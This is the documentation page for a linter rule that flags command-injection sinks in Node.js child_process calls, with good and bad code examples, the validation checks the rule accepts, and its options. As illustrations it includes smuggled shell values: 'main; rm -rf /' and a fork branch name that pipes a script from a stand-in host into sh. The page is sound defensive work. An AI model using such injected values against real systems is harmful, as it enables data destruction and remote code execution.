# `noctcore-security/no-shell-interpolation`

> A dynamically-built command string must not flow into a shell runner. Pass the program and its arguments separately.

<!-- begin generated rule header -->
✅ In `recommended` at `error` · 💭 Type information: not needed
<!-- end generated rule header -->

## Why

A dynamically-interpolated command string handed to a shell is the classic command-injection sink:

```ts bad
// a crafted `branch` runs arbitrary commands
exec(`git checkout ${branch}`);
```

If `branch` is `main; rm -rf /`, the shell happily runs both. The fix is to pass the program and its
arguments separately, so the OS never re-parses a shell string:

```ts good
// no shell: arguments cannot inject
execFile('git', ['checkout', branch]);
```

## What it flags

Precision is the whole point — this rule fires **only** on the genuinely dangerous shape:

- **`exec` / `execSync`** (always run a shell): a first argument that is a template literal with
  expressions, or a `+` concatenation with a dynamic part.
- **`spawn` / `spawnSync` / `execFile` / `execFileSync`**: the same dynamic first argument, but **only**
  when an options object literal passes a `shell` value other than `false`: `true`, a shell path
  string, or any value decided at run time.

```ts bad
// shell:true re-parses the interpolated command
spawn(`cmd ${x}`, { shell: true });
```

A shell chosen at run time is a shell on some machine. This call is an injection sink on Windows
only, which is exactly where a macOS developer never sees it fail:

```ts bad
spawn(`git ${branch}`, { shell: process.platform === 'win32' });
```

### Promisified runners

A binding made with `promisify` from a `child_process` runner is followed through scope and checked
like the runner it wraps (`util.promisify(cp.exec)` too):

```ts bad
import { exec } from 'node:child_process';
import { promisify } from 'node:util';

const execAsync = promisify(exec);

export async function checkout(branch: string) {
  await execAsync(`git checkout ${branch}`);
}
```

```ts good
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';

const execFileAsync = promisify(execFile);

export async function checkout(branch: string) {
  await execFileAsync('git', ['checkout', branch]);
}
```

There is **no autofix**: the safe rewrite changes the call shape (string → program + args array).

## What it does not flag

The array-args, no-shell forms are safe and left alone, even with a dynamic argument (and with a
statically off `shell`: `false`, `null`, `undefined` or `''`):

```ts good
// left alone: no shell
spawn('ls', [dir]);
execFile('git', ['log', branch]);
```

`exec` called as a **member on a non-`child_process` object** — notably `regex.exec(...)` — is
excluded so `RegExp.prototype.exec` never false-positives. The `child_process` member form is
recognised via the conventional object names `cp` / `childProcess` / `child_process`, or the bare
imported `exec(...)`.

An options object passed by name (`spawn(cmd, options)`) is not followed, so its `shell` value is
not seen. A runner wrapped some other way than `promisify` (a hand-written `new Promise` around
`exec`) is not followed either; name the wrapper in `extraCallees`.

A fully static command is not flagged either: `exec('ls -la')`, a template literal with no
expressions, or a `+` of literals only (`'ls ' + '-la'`). Neither is a part that is an in-file
`const` literal (`const BIN = '/usr/bin/git'`).

### Values the function already checked

A runtime part is left alone when the function gave up on any other value before the call: an
`if` whose branch ends in `return`, `throw`, `break` or `continue`, earlier in an enclosing block,
or an `if (check) { ... }` around the call, in the same function as the call: a check outside a
callback, or above a hoisted function declaration, does not count inside it. The check must be one
the rule can read:

- an allowlist of literals: `includes` on an array literal, `has` on a `new Set([...])` (inline or
  in a `const`), `indexOf(x) === -1` / `!== -1`, `===` / `!==` against literals or in-file `const`
  strings, or `==` / `!=` against a string literal. A list in a `const` counts only if it never
  changes: it is wrapped in `Object.freeze([...])`, or it is not exported and every use of it is an
  `includes` / `indexOf` / `has` call (or `new Set(list)`), so no `push`, `add` or `list[0] = x`
  anywhere;
- `test` with a regex (inline or in a `const`) anchored at both ends, without the `m` flag, whose
  every character is shell-inert: no `.`, no `\s`, no negated class, none of
  ``;&|$`()<>{}[]*?!~'"\^``, and no whitespace or line break (a space splits the value into
  several arguments). A regex that admits `-` or `#` must pin the first character to something
  else (`^[a-z][a-z0-9-]*$`): a leading `-` turns the value into an option (argument injection,
  CWE-88) and a leading `#` comments out the rest. A value glued to text before it in the same
  word (`` `git log --author=${author}` ``) cannot start an option, so there `-` and `#` may lead.
  Text ending in `-` or `+` does not count as inside a word: `` `tool -${x}` `` with
  `x = '-output=f'` is a long option. The regex must not accept the empty string (`^[a-z]*$`,
  `^([a-z]+)?$`): an empty value drops out of the command, so `` `rm -rf /srv/${x}` `` removes
  `/srv/` and an empty argument shifts the ones after it. A regex in a `const` counts only if it
  is not exported and every use of it is a `test` / `exec` call or an argument of `pattern`,
  `regex`, `match` and the like, so no `RE.test = ...` or `RE.compile(...)`;
- a schema with such a pattern or a literal set: `const { error, value } = schema.validate(x)`
  followed by an exiting `if (error)`, `schema.parse(x)` (which throws), or `result.data` of
  `const result = schema.safeParse(x)` after an exiting `if (!result.success)`; a field of a parsed
  object schema counts when that field's schema does (`Body.parse(body).mode`,
  `const { mode } = Body.parse(body)` with `z.object({ mode: z.enum([...]) })`), as long as nothing
  changes the parsed object or the result (every use of `parsed` reads a field and every use of
  `result` reads `success`, `error` or `data`, so no `parsed.mode = other`, `result.data = other`
  or `Object.assign(parsed, other)`, before or after the check) and no spread, computed key or
  later key of the same name follows the field in the shape. The schema is an in-file chain that starts at
  the zod or joi import (`import { z } from 'zod'`, `import Joi from 'joi'`, `require('joi')`),
  possibly through `const` chains read under the same rules, with `.pattern(re)` / `.regex(re)`
  (no options argument; a string name or message is fine) or `.valid(...)` / `.enum([...])` /
  `.literal(...)`, and every other method in the chain only narrows (`min`, `max`, `length`,
  `required`, `optional`, `trim`, `lowercase` and the like). A chain with `default`, `catch`, `failover`, `pipe`, `transform`, `allow` or any other method
  can let another value through and is not read. Every `const` in the chain must stay unchanged:
  not exported, and every use a type position (`z.infer<typeof S>`), a direct `parse` /
  `safeParse` / `validate` call (or their async forms), a chain step (`S.min(1)`) or an argument
  of a schema builder (`z.object({ mode: S })`, `z.array(S)`) whose result is itself used only
  these ways, or the initializer of a binding that follows the same rules. Anything else cancels
  it: `S.parse = (v) => v`, `S._def.checks.pop()`, `const d = S._def`, `Object.assign(S, x)`, a
  helper call such as `patch(S)`, or a change through a schema that holds it
  (`const B = z.object({ m: S }); B.shape.m.parse = ...`). The zod or joi root may only be used
  through calls (`z.string()`, `z.coerce.number()`) and in types, so `extendZod(z)` or
  `z.ZodString.prototype.parse = ...` cancels every schema in the file.

A value in a word that runs as a program is proven only by a literal allowlist, a literal
`enum` / `valid` schema or a constant. No regex or schema pattern proves it: `^[a-z]+$` admits
`reboot` and `sh`. A word runs as a program when it is:

- the first word of a command: first in the string, or after `;`, `&`, `|`, `(`, `)`, a backtick or
  a line break, after `NAME=value`, after a redirect (`>out`, `2>/dev/null`, `< in`), or after a
  reserved word (`!`, `{`, `if`, `then`, `else`, `elif`, `do`, `while`, `until`); a value glued to a
  path there (`/usr/bin/${tool}`, `./${tool}`) counts too;
- any word after a wrapper, up to the next separator, options included (`sudo -u deploy ${tool}`,
  `timeout 30 ${tool}`, `sh -c '${cmd}'`). The wrappers are `sudo`, `doas`, `su`, `runuser`,
  `env`, `nice`, `ionice`, `nohup`, `setsid`, `timeout`, `stdbuf`, `taskset`, `flock`, `time`,
  `watch`, `xargs`, `strace`, `ltrace`, `chroot`, `nsenter`, `unshare`, `exec`, `command`,
  `builtin`, `eval`, `source`, `.`, `coproc`, `ssh` (everything after the host runs remotely),
  the shells `sh`, `bash`, `zsh`, `dash`, `ksh`, `fish` and `busybox`, and the package runners
  `npx`, `bunx`, `uvx`, `pipx`, `npm exec`, `pnpm dlx` / `exec`, `yarn dlx` / `exec` and
  `bun x`, plus `find ... -exec` / `-execdir` / `-ok` / `-okdir`. They match by basename and with
  quotes stripped (`/usr/bin/env`, `'sudo'`).

An in-file `const` bound to a string (`const P = 'sudo'`, `const SEP = ';'`) is read as its text.
This is a list: a command not on it that runs its arguments is not seen. Quotes do not hide
separators here, so `` `echo "a; ${x}"` `` reads `x` as a program, which only reports more.

```ts bad
function run(tool: string, file: string) {
  if (!/^[a-z]+$/.test(tool) || !/^[a-z]+$/.test(file)) return;
  exec(`${tool} ${file}`);
}
```

```ts good
const TOOLS = ['git', 'ls'];
function run(tool: string, file: string) {
  if (!TOOLS.includes(tool) || !/^[a-z]+$/.test(file)) return;
  exec(`${tool} ${file}`);
}
```

Every write to the checked binding must come before the check, in the function that declares it:
a write from a nested function (`const reset = () => { x = other; }`) cancels the check, since it
can run at any time. A binding declared outside the checking function (a closure over an outer
`let`) must never be written after its `let` or `const` declaration, since the checking function
can run between the outer writes (hoisted above them, or resumed after an `await`). A change made
through an alias (`const p = parts; p.push(y)`), `Object.assign` or `Reflect.set` counts as a
write, and so does a list or `Set` changed through another `const` name for it. A count written as
`{00}` allows zero repetitions like `{0}`. A value glued right after a `/` (`` `rm -rf /srv/${x}` ``)
is a path segment, so its regex must refuse `.` and `..` as well as the empty string. A direct
`eval(s)` (also behind a type-only wrapper such as `eval!(s)` or `(eval as any)(s)`) in the
function after the check, or
in any function nested in the one that declares the binding, counts as a write. A global with no
declaration in the file (one the config declares writable) is never treated as checked: another
script can reassign it, across an `await` for instance. The rule follows `const` aliases (`const picked = sort`)
and the global `String(x)`:

```ts bad
// the check does not stop the call: it only logs
function list(sort: string) {
  if (!['asc', 'desc'].includes(sort)) log('unknown sort');
  exec(`ls --sort ${sort}`);
}
```

```ts good
// only `asc` or `desc` reach the shell
function list(sort: string) {
  if (!['asc', 'desc'].includes(sort)) return;
  exec(`ls --sort ${sort}`);
}
```

```ts good
// an anchored, shell-inert pattern
function list(name: string) {
  if (!/^[a-z0-9_][a-z0-9_-]*$/.test(name)) throw new Error('bad name');
  exec(`ls ${name}`);
}
```

A check that runs after the call, tests another variable, uses a list the rule cannot see
(`list.includes(x)` on a parameter), or a regex that is unanchored (`/[a-z]+/`) or admits a
metacharacter keeps the report.

### Values the operator sets

A value read from `process.env` is reported by default. In CI some variables hold text an outsider
chose: `GITHUB_HEAD_REF` is the branch name of a pull request from a fork, and a branch can be
named `` a;curl${IFS}evil.sh|sh ``.

```ts bad
exec(`git checkout ${process.env.GITHUB_HEAD_REF}`);
```

With `trustEnvironment: true`, a value read from `process.env` with a fixed key is treated as set
by whoever runs the process and left alone: directly, through `const` bindings, `String()`, string
methods with literal arguments (`.trim()`, `.replace(/\0/g, '')`), literal fallbacks (`|| ''`),
and templates or `+` of such values and literals. A computed key (`process.env[name]`) is still
reported. Turn it on only where no variable carries outside input.

```ts bad options={"trustEnvironment":true}
// a computed key could name any variable
export function status(name: string) {
  exec(`git -C ${process.env[name]} status`);
}
```

```ts good options={"trustEnvironment":true}
export function status() {
  exec(`git -C ${process.env.REPO_DIR} status`);
}
```

### What the rule does not see

A value from a literal allowlist is taken as the author wrote it: an allowlist that holds a wrapper
(`sudo`) or a separator lets the words after it be read as arguments. A wrapper command that is not
on the list above is not seen.

A checked array changed in place after the check (`parts.push(y)`, `parts[0] = y`) cancels the
check. Handing it to a function, or storing it in an array or object, after the check also cancels
it when the function gave the binding an array, object or `new` value itself (`const parts =
[x]`). A parameter that receives an array from the caller (an Express query string can produce
one) and is then handed to a helper that changes it is not tracked; check the string you
interpolate. In a sloppy-mode script, a parameter of a function that uses `arguments` is never
treated as checked, since `arguments[0] = other` changes it; ES modules and TypeScript output are
strict, where it does not. An imported binding (`import { mode } from './state'`) is never treated
as checked: the other module can reassign it after the check.

## Options

| Option | Type | Default | Meaning |
| --- | --- | --- | --- |
| `extraCallees` | `string[]` | `[]` | Extra callee names to treat as always-shell command runners (checked like `exec`). |
| `trustEnvironment` | `boolean` | `false` | Leave values read from `process.env` with a fixed key alone. Off by default because CI variables such as `GITHUB_HEAD_REF` hold outside input. |

```js
'noctcore-security/no-shell-interpolation': ['error', { extraCallees: ['runShell', 'sh'] }]
```

## When not to use it

If a call site is safe in a way the rule cannot read (a check in another function, a list from
another module), refactor to `execFile` anyway, since it is clearer, or disable the rule for that
line.
